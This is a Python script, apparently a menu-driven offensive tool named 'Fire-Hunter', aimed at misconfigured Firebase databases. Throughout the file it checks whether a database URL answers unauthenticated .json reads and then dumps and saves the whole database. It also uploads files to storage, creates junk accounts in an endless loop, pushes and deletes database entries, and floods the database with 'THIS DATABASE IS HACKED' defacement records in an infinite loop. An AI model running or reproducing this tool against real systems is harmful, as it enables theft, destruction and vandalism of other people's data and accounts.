#NO COPYRIGHTS ,EDITING OR MODIFICATION ALLOWED(original script by xro)
import requests
import os
import random
import banner
import time

print(banner)
print(banner.creator)
print(banner.dots)
print(banner.choice)
print(banner.dots)
print()
choice=input(" Please Enter Your Choice To Continue : ")

#main selections
if choice=="1":
    databaseurl=input("[-]ENTER DATABASE URL : ")
    try:
        r = requests.get(databaseurl+ '.json')
        if r.status_code==401:
            print("\n THIS DATABASES'S SECURITY RULES ARE QUITE GOOD.TRY AUTHENTICATED ATTACK")
        elif r.status_code==200:
            print("\n THIS DATABASE IS VULNERABLE FOR DATABASE CLONING.TRY DUMPING USING OPTION [2]")
        else:
            print(" THIS DATABASE HAS GOOD SECURITY RULES AND NEED BETTER EXPLOITATION POWER")
    except:
        print("\n SORRY, AN ERROR OCCURED OR INVALID USER BEHAVIOUR")
elif choice=="9":
    f = open("assistance.txt", "r")
    print(f.read())
elif choice=="2":
    databaseurl = input("[-]ENTER DATABASE URL : ")
    try:
        r=requests.get(databaseurl+'.json')
        if r.status_code==200:
            print("\nHERE IS FULL DATABASE \n")
            time.sleep(5)
            print(r.text)
            file=r.text
            save=input("\nDo you want to save it as a txt file?(y/n) : ")
            if save=="y":
                w = open("database_json.txt", "w")
                w.write(file)
                print(" FILE CREATED AS database_json.txt IN THIS DIRECTORY")
                w.close()
            else:
                print()
    except:
        " AN ERROR OCCURED ! PLEASE CHECK DATABASE VULNERABILITY USING OPTION [1]"
elif choice=="3":
    try:
        import config
        key=input("Enter the key you need to check data : ")
        data = config.db.child(key).get()
        print(banner.dots)
        print(data.val())
        try:
            for datas in data.each():
                print(datas.val())
        except:
            print("FAILED TO LOAD SEQUENCIAL DATA IN KEY(PROBABLY DUETO SINGLE CHILD CONTENT AVAILABLE)")
            print(banner.dots)
    except:
        print(" ERROR : SUCH DATA DOES NOT EXIST")
elif choice=="4":
    try:
        import config
        file=input(" Enter the file path from local machine which you want to upload : ")
        uploaded=input(" Enter the file name with extension(TO STORE IN STORAGE) : ")
        upload=config.media.child(uploaded).put(file)
        print(' SUCCESS : FILE UPLOADED TO STORAGE BUCKET\n ACESS LINK IS GENERATED BELOW\n')
        print(config.media.child(uploaded).get_url(None))
    except:
        print(" ERROR : PERMISSION DENIED ")
elif choice=="5":
    import config
    print(banner.dots)
    print("\n[1]CREATE UNBEARABLE JUNK ACCOUNTS\n[2]LOGIN USING EXISTING ACCOUNT\n[3]SIGN UP FOR ACCOUNT")
    print(banner.dots)
    acc=input(" ENTER YOUR CHOICE PLEASE : ")
    if acc=="1":
        try:
            print(
                " WARNING : THIS WILL CREATE UNBEARBALE NUMBER OF USER ACCOUNTS AND THIS PROCESS WILL CONTINUE UNTIL YOU EXIT THE SESSION.\nDEFAULT PASSWORD - password")
            time.sleep(5)
            while 0 != 1:
                temp = random.sample(banner.wordlist, 6)
                email_e = "".join(temp)
                email = email_e + "@gmail.com"
                password = "password"
                print(email)
                config.auth.create_user_with_email_and_password(email, password)
        except:
            print('error : EMAIL AUTH PROVIDER IS NOT ADDED FOR THIS PROJECT')
    elif acc=="2":
        try:
            login_email=input(' ENTER EMAIL ADRESS : ')
            login_password=input(' ENTER LOGIN PASSWORD : ')
            config.auth.sign_in_with_email_and_password(login_email,login_password)
            print("   Successfully Logged In ")
        except:
            print("Invalid Login Credentials")
    elif acc=="3":
        try:
            signup_email=input(' ENTER EMAIL ADRESS : ')
            signup_password=input(" ENTER SIGNUP PASSWORD : ")
            config.auth.create_user_with_email_and_password(signup_email,signup_password)
            print('SUCESSFULLY CREATED ACCOUNT\n')
            print("YOUR ACCOUNT EMAIL IS : "+signup_email)
            print("YOUR ACCOUNT PASSWORD IS : "+signup_password)
        except:
            print(' THE GIVEN AUTH PROVIDER IS DISABLED FOR THIS PROJECT')
elif choice=="6":
    try:
        import config
        print()
        child_key = input(" Enter path of child   : ")
        head = input(' Enter value under child key "head" : ')
        message = input(' Enter value under child key "message" : ')
        data = {'head': head, 'message': message}
        config.db.child(child_key).push(data)
        print('SUCESSFULLY UPLOADED')
    except:
        print('error : AUTHENTICATION REQUIRED')
elif choice=="7":
    try:
        import config
        delete=input(" Enter the child to delete : ")
        config.db.child(delete).remove()
        print("\n SUCCESSFULLY DELETED CHILD")
    except:
        print("SORRY, AN ERROR OCCURED")
elif choice=="8":
    while 0!=1:
        import config
        spam_e = random.sample(banner.wordlist, 5)
        spam = "".join(spam_e)
        spam_data={'hacked':"THIS DATABASE IS HACKED USING FIRE-HUNTER TOOL",'warning':"DATABASE CLONING ATTACK"}
        config.db.child(spam).push(spam_data)
        print(spam+" SENT SUCCESSFULLY")
